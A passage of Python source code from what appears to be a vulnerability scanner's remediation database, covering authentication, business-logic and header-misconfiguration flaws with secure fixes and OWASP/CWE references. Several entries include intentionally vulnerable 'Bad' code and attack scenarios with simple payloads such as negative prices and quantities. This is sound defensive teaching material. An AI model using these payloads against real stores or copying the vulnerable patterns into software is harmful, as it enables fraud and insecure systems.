        },
        
        'Broken Authentication': {
            'priority': 'CRITICAL',
            'fix_time': '2-4 days',
            'steps': [
                'Implement multi-factor authentication',
                'Use strong password policies',
                'Implement account lockout mechanisms',
                'Use secure session management',
                'Implement proper logout functionality',
                'Use secure password reset mechanisms',
                'Monitor for brute force attempts'
            ],
            'code_example': '''
# Bad (Weak authentication):
if username == "admin" and password == "password":
    session['user'] = username

# Good (Secure authentication):
import bcrypt
from datetime import datetime, timedelta

user = User.query.filter_by(username=username).first()
if user and bcrypt.checkpw(password.encode(), user.password_hash):
    if user.failed_attempts >= 5:
        if user.locked_until and user.locked_until > datetime.now():
            return "Account locked"
        user.failed_attempts = 0
    
    session['user_id'] = user.id
    session['logged_in_at'] = datetime.now()
    user.failed_attempts = 0
    user.save()
else:
    if user:
        user.failed_attempts += 1
        if user.failed_attempts >= 5:
            user.locked_until = datetime.now() + timedelta(minutes=30)
        user.save()
''',
            'solution': '''
SOLUTION:
1. Implement MFA
2. Use strong password hashing (bcrypt/Argon2)
3. Account lockout after failed attempts
4. Secure session tokens
5. Implement CAPTCHA
6. Monitor authentication failures

ERROR CODE: CWE-287 (Improper Authentication)
''',
            'references': [
                'OWASP Authentication Cheat Sheet',
                'CWE-287: Improper Authentication',
                'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html'
            ]
        },
        
        'Business Logic - Price Manipulation': {
            'priority': 'CRITICAL',
            'fix_time': '1-2 days',
            'steps': [
                'Validate all price calculations server-side',
                'Never trust client-provided prices',
                'Implement server-side price lookups from database',
                'Use cryptographic signatures for price verification',
                'Log all price modifications for audit',
                'Implement price range validation',
                'Use decimal precision for currency calculations'
            ],
            'exploit_example': '''
ATTACK SCENARIO - Price Manipulation:
1. Find price parameter in request: POST /checkout {price: 99.99, productId: 123}
2. Modify price to negative or zero: {price: -50.00, productId: 123}
3. Complete purchase with manipulated price
4. Attacker receives money instead of paying

COMMON ERROR: Application trusts client-sent prices
ATTACK PAYLOADS:
price=-100.00
price=0.01
price=null
amount=-999999
''',
            'code_example': '''
# Bad (Vulnerable - trusts client):
@app.route('/checkout', methods=['POST'])
def checkout():
    price = request.json['price']
    product_id = request.json['productId']
    # Uses client-provided price!
    process_payment(price)

# Good (Secure - server-side validation):
@app.route('/checkout', methods=['POST'])
def checkout():
    product_id = request.json['productId']
    
    # Lookup price from database
    product = Product.query.get(product_id)
    if not product:
        return {"error": "Invalid product"}, 400
    
    # Use server-side price
    server_price = product.price
    
    # Validate price is positive
    if server_price <= 0:
        return {"error": "Invalid price"}, 400
    
    # Log transaction
    log_transaction(product_id, server_price)
    
    # Process with server price
    process_payment(server_price)
''',
            'solution': '''
SOLUTION - Prevent Price Manipulation:

1. SERVER-SIDE PRICE VALIDATION:
   - NEVER trust client-provided prices
   - Always lookup prices from your database
   - Validate price > 0 before processing

2. CRYPTOGRAPHIC VERIFICATION:
   - Sign prices with HMAC when sending to client
   - Verify signature before processing payment
   - Detect tampering attempts

3. AUDIT LOGGING:
   - Log all price changes and transactions
   - Monitor for suspicious price patterns
   - Alert on negative or zero prices

4. INPUT VALIDATION:
   - Reject negative values
   - Reject prices outside expected range
   - Use decimal types for currency (not float)

ERROR CODE REFERENCE:
- CWE-840: Business Logic Errors
- CWE-841: Improper Enforcement of Behavioral Workflow
- OWASP: Business Logic Vulnerability

FINANCIAL IMPACT: Direct monetary loss, fraud, chargebacks
''',
            'references': [
                'OWASP Business Logic Vulnerabilities',
                'CWE-840: Business Logic Errors',
                'https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability',
                'https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html'
            ]
        },
        
        'Business Logic - Negative Quantity': {
            'priority': 'HIGH',
            'fix_time': '1 day',
            'steps': [
                'Validate quantity is a positive integer',
                'Implement server-side quantity checks',
                'Set maximum quantity limits',
                'Reject negative values immediately',
                'Log suspicious quantity attempts',
                'Implement cart validation before checkout'
            ],
            'exploit_example': '''
ATTACK SCENARIO - Negative Quantity:
1. Add item to cart with normal quantity
2. Modify quantity to negative value: -5
3. Checkout with negative quantity
4. Result: Refund instead of payment

ATTACK PAYLOADS:
quantity=-1
qty=-999
amount=-10
count=-5
''',
            'code_example': '''
# Bad (Vulnerable):
quantity = int(request.POST['quantity'])
total_price = item.price * quantity
# Negative quantity results in negative total!

# Good (Secure):
quantity = int(request.POST.get('quantity', 0))

# Validate quantity
if quantity < 1:
    return {"error": "Quantity must be positive"}, 400
if quantity > 100:
    return {"error": "Maximum quantity is 100"}, 400

# Calculate total
total_price = item.price * quantity
if total_price <= 0:
    return {"error": "Invalid total"}, 400
''',
            'solution': '''
SOLUTION:
1. Validate quantity >= 1
2. Set maximum quantity limit (e.g., 100)
3. Reject any negative values
4. Validate total price > 0
5. Server-side validation always

ERROR CODE: CWE-840 (Business Logic Errors)
IMPACT: Financial loss through refund manipulation
''',
            'references': [
                'OWASP Business Logic Vulnerabilities',
                'CWE-840: Business Logic Errors',
                'https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability'
            ]
        },
        
        'Business Logic - Excessive Quantity': {
            'priority': 'MEDIUM',
            'fix_time': '1 day',
            'steps': [
                'Implement maximum quantity limits per transaction',
                'Check inventory availability',
                'Validate against reasonable business limits',
                'Implement rate limiting for large orders',
                'Add manual review for high-value orders'
            ],
            'code_example': '''
# Bad (No limits):
quantity = request.POST['quantity']
process_order(quantity)

# Good (With limits):
MAX_QUANTITY = 100
quantity = int(request.POST.get('quantity', 0))

if quantity > MAX_QUANTITY:
    return {"error": f"Maximum quantity is {MAX_QUANTITY}"}, 400

# Check inventory
if quantity > item.stock:
    return {"error": "Insufficient stock"}, 400

process_order(quantity)
''',
            'solution': '''
SOLUTION:
1. Set maximum quantity per order
2. Check inventory before processing
3. Flag large orders for review
4. Implement business rules

ERROR CODE: CWE-840
''',
            'references': [
                'OWASP Business Logic',
                'CWE-840: Business Logic Errors'
            ]
        },
        
        'Business Logic - Workflow Bypass': {
            'priority': 'HIGH',
            'fix_time': '2-3 days',
            'steps': [
                'Implement server-side workflow state management',
                'Validate workflow progression server-side',
                'Use signed tokens for workflow steps',
                'Prevent skipping required steps',
                'Implement step completion verification'
            ],
            'exploit_example': '''
ATTACK SCENARIO - Workflow Bypass:
1. Multi-step checkout: Cart → Shipping → Payment → Confirm
2. Attacker skips payment step
3. Goes directly from shipping to confirm
4. Order completed without payment

ATTACK TECHNIQUE:
- Manipulate step parameter: step=4 (skip to final step)
- Bypass required validation
''',
            'code_example': '''
# Bad (Client controls workflow):
step = request.GET['step']
if step == '4':
    complete_order()

# Good (Server validates workflow):
session = get_session()

required_steps = ['cart_validated', 'shipping_complete', 'payment_processed']
for step in required_steps:
    if not session.get(step):
        return {"error": "Complete previous steps"}, 400

# All steps verified, proceed
complete_order()
session.clear()
''',
            'solution': '''
SOLUTION:
1. Server-side workflow state tracking
2. Validate all required steps completed
3. Use session to track progress
4. Never trust client-provided step numbers
5. Clear session after completion

ERROR CODE: CWE-840, CWE-841
''',
            'references': [
                'OWASP Business Logic',
                'CWE-841: Workflow Enforcement'
            ]
        },
        
        'Business Logic - Race Condition': {
            'priority': 'CRITICAL',
            'fix_time': '2-3 days',
            'steps': [
                'Implement database transactions with proper locking',
                'Use SELECT FOR UPDATE for inventory checks',
                'Implement optimistic or pessimistic locking',
                'Add unique constraints where needed',
                'Use atomic operations',
                'Implement request deduplication'
            ],
            'exploit_example': '''
ATTACK SCENARIO - Race Condition:
1. Limited stock item: only 1 remaining
2. Attacker sends 10 simultaneous purchase requests
3. All requests check stock simultaneously
4. All see "1 available"
5. All 10 purchases succeed
6. Result: Overselling, negative inventory

ATTACK TECHNIQUE:
- Send multiple parallel requests
- Exploit time-of-check to time-of-use (TOCTOU) gap
''',
            'code_example': '''
# Bad (Race condition):
if product.stock > 0:
    # Gap here! Other requests can check simultaneously
    product.stock -= 1
    product.save()
    create_order()

# Good (With transaction locking):
from django.db import transaction

@transaction.atomic
def purchase_product(product_id):
    # Lock row for update
    product = Product.objects.select_for_update().get(id=product_id)
    
    if product.stock < 1:
        raise ValueError("Out of stock")
    
    # Atomic decrement
    product.stock -= 1
    product.save()
    create_order(product_id)
''',
            'solution': '''
SOLUTION:
1. Use database transactions
2. SELECT FOR UPDATE to lock rows
3. Atomic operations (decrement)
4. Handle concurrent requests properly
5. Implement idempotency keys

ERROR CODE: CWE-362 (Race Condition)
''',
            'references': [
                'OWASP Race Conditions',
                'CWE-362: Concurrent Execution',
                'https://owasp.org/www-community/vulnerabilities/Race_Conditions'
            ]
        },
        
        'Security Misconfiguration': {
            'priority': 'MEDIUM',
            'fix_time': '1-2 days',
            'steps': [
                'Add all missing security headers to HTTP responses',
                'Configure Content-Security-Policy to prevent XSS attacks',
                'Enable HTTP Strict Transport Security (HSTS)',
                'Disable directory listings and unnecessary HTTP methods',
                'Remove server version information from headers',
                'Configure secure session cookies (Secure, HttpOnly, SameSite)',
                'Disable debug mode and verbose errors in production'
            ],
            'exploit_example': '''
ATTACK SCENARIO - Security Misconfiguration:
1. Missing X-Content-Type-Options: nosniff
   - Attacker can exploit MIME type sniffing
   - Browser may execute malicious content as JavaScript
   - Example: Upload image.jpg containing JavaScript, browser executes it

2. Missing X-Frame-Options or CSP frame-ancestors
   - Attacker creates iframe embedding your site
   - Enables clickjacking attacks
   - Example: <iframe src="https://victim.com/transfer"></iframe>

3. Missing Content-Security-Policy
   - Allows inline JavaScript execution
   - XSS attacks become easier
   - No protection against code injection

4. Missing HSTS (Strict-Transport-Security)
   - Man-in-the-middle attacks possible
   - SSL stripping attacks
   - Users can be downgraded to HTTP

5. Server version disclosure
   - Reveals exact server version in headers
   - Attackers can target known vulnerabilities
   - Example: Server: Apache/2.4.48 (Ubuntu)

COMMON VULNERABLE HEADERS:
- Missing: X-Content-Type-Options
- Missing: X-Frame-Options  
- Missing: Content-Security-Policy
- Missing: Strict-Transport-Security
- Missing: X-XSS-Protection
- Present: Server version information
''',
            'code_example': '''
# Bad (No security headers):
@app.route('/page')
def page():
    return render_template('page.html')

# Good (Secure headers - Python/Flask):
from flask import Flask, make_response

@app.after_request
def add_security_headers(response):
    # Prevent MIME sniffing
    response.headers['X-Content-Type-Options'] = 'nosniff'
    
    # Prevent clickjacking
    response.headers['X-Frame-Options'] = 'DENY'
    
    # Content Security Policy
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
    
    # Force HTTPS
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    
    # XSS Protection
    response.headers['X-XSS-Protection'] = '1; mode=block'
    
    # Referrer Policy
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    
    # Permissions Policy
    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
    
    return response

# Good (Secure headers - Django):
# middleware.py
class SecurityHeadersMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response
    
    def __call__(self, request):
        response = self.get_response(request)
        response['X-Content-Type-Options'] = 'nosniff'
        response['X-Frame-Options'] = 'DENY'
        response['Content-Security-Policy'] = "default-src 'self'"
        response['Strict-Transport-Security'] = 'max-age=31536000'
        return response

# Good (Secure headers - Node.js/Express):
const helmet = require('helmet');
app.use(helmet());

// Or manually:
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Content-Security-Policy', "default-src 'self'");
    res.setHeader('Strict-Transport-Security', 'max-age=31536000');
    next();
});

# Good (Apache .htaccess):
<IfModule mod_headers.c>
    Header set X-Content-Type-Options "nosniff"
    Header set X-Frame-Options "DENY"
    Header set Content-Security-Policy "default-src 'self'"
    Header set Strict-Transport-Security "max-age=31536000"
    Header unset Server
    Header unset X-Powered-By
</IfModule>

# Good (Nginx):
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "DENY" always;
add_header Content-Security-Policy "default-src 'self'" always;
add_header Strict-Transport-Security "max-age=31536000" always;
server_tokens off;
''',
            'solution': '''
SOLUTION - Security Headers Configuration:

1. X-CONTENT-TYPE-OPTIONS (Prevents MIME sniffing):
   X-Content-Type-Options: nosniff
   - Prevents browsers from interpreting files as different MIME type
   - Stops image files being executed as JavaScript
   - Essential for upload functionality security

2. X-FRAME-OPTIONS (Prevents clickjacking):
   X-Frame-Options: DENY
   Or: X-Frame-Options: SAMEORIGIN
   - Prevents your site from being embedded in iframes
   - Protects against clickjacking attacks
   - Use SAMEORIGIN if you need to iframe your own pages

3. CONTENT-SECURITY-POLICY (Prevents XSS):
   Content-Security-Policy: default-src 'self'; script-src 'self'
   - Controls which resources can be loaded
   - Prevents inline JavaScript execution
   - Strong defense against XSS attacks

4. STRICT-TRANSPORT-SECURITY (Enforces HTTPS):
   Strict-Transport-Security: max-age=31536000; includeSubDomains
   - Forces browser to always use HTTPS
   - Prevents SSL stripping attacks
   - Protects against man-in-the-middle

5. HIDE SERVER VERSION:
   - Apache: ServerTokens Prod, ServerSignature Off
   - Nginx: server_tokens off;
   - Remove X-Powered-By header
   - Don't reveal technology stack

6. SECURE COOKIES:
   Set-Cookie: session=...; Secure; HttpOnly; SameSite=Strict
   - Secure: Only send over HTTPS
   - HttpOnly: Prevent JavaScript access
   - SameSite: Prevent CSRF attacks

QUICK FIX FOR YOUR ISSUE (X-Content-Type-Options missing):
Add this header to all HTTP responses:
X-Content-Type-Options: nosniff

IMPLEMENTATION EXAMPLES:
- Python/Flask: response.headers['X-Content-Type-Options'] = 'nosniff'
- Django: SECURE_CONTENT_TYPE_NOSNIFF = True in settings.py
- Node.js/Express: res.setHeader('X-Content-Type-Options', 'nosniff')
- Apache: Header set X-Content-Type-Options "nosniff"
- Nginx: add_header X-Content-Type-Options "nosniff" always;

ERROR CODE REFERENCE:
- CWE-16: Configuration
- CWE-2007 Missing Security Headers
- OWASP A05:2021 - Security Misconfiguration
''',
            'references': [
                'OWASP Security Headers Cheat Sheet',
                'CWE-16: Configuration',
                'https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html',
                'https://securityheaders.com/',
                'https://owasp.org/www-project-secure-headers/'
            ]
        }
    }
    
    @classmethod
    def get_remediation(cls, vulnerability_type: str) -> Dict:
        """
        Get detailed remediation guidance for a vulnerability type.
        
        Args:
            vulnerability_type: Type of vulnerability
            
        Returns:
            Dictionary with remediation details
        """
        # Try to find exact match first
        for key, value in cls.REMEDIATION_DATABASE.items():
            if key.lower() in vulnerability_type.lower() or \
               vulnerability_type.lower() in key.lower():
                return value
        
        # Return generic guidance if specific not found
        return {
            'priority': 'MEDIUM',
            'fix_time': '1-3 days',
            'steps': [
                'Review the vulnerability description and evidence',
                'Consult OWASP guidelines for this vulnerability type',
                'Implement proper input validation and output encoding',
                'Apply security patches and updates',
                'Conduct thorough testing after remediation'
            ],
            'code_example': 'Refer to security best practices for this vulnerability type',
            'references': [
                'OWASP Top 10',
                'https://owasp.org/www-project-top-ten/'
            ]
        }
    
    @classmethod
    def enhance_vulnerability(cls, vulnerability: Dict) -> Dict:
        """
        Enhance vulnerability dict with detailed remediation.
        
        Args:
            vulnerability: Vulnerability dictionary
            
        Returns:
            Enhanced vulnerability dictionary
        """
        vuln_type = vulnerability.get('type', '')
        remediation_details = cls.get_remediation(vuln_type)
        
        vulnerability['remediation_details'] = remediation_details
        
        # Copy important fields directly to vulnerability for easy template access
        if 'code_example' in remediation_details:
            vulnerability['code_example'] = remediation_details['code_example']
        if 'solution' in remediation_details:
            vulnerability['solution'] = remediation_details['solution']
        if 'steps' in remediation_details and 'steps_to_fix' not in vulnerability:
            vulnerability['steps_to_fix'] = remediation_details['steps']
        if 'exploit_example' in remediation_details:
            vulnerability['exploit_example'] = remediation_details['exploit_example']
        if 'references' in remediation_details:
            vulnerability['references'] = remediation_details['references']
        
        # Keep original remediation as summary
        if 'remediation' not in vulnerability or not vulnerability['remediation']:
            vulnerability['remediation'] = remediation_details['steps'][0]
        
        return vulnerability
